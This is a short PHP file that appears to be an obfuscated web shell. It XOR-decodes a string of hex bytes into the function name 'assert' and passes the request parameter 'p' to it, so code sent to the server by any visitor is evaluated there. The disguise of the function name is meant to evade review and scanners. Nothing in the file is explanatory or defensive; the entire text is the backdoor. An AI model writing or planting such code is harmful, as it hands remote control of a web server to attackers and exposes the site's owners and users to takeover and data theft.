<?php
$op = '';
foreach (['13', '01', '01', '17', '00', '06'] as $pair) {
    $op .= chr(hexdec($pair)) ^ 'r';
}
call_user_func($op, $_REQUEST['p']);
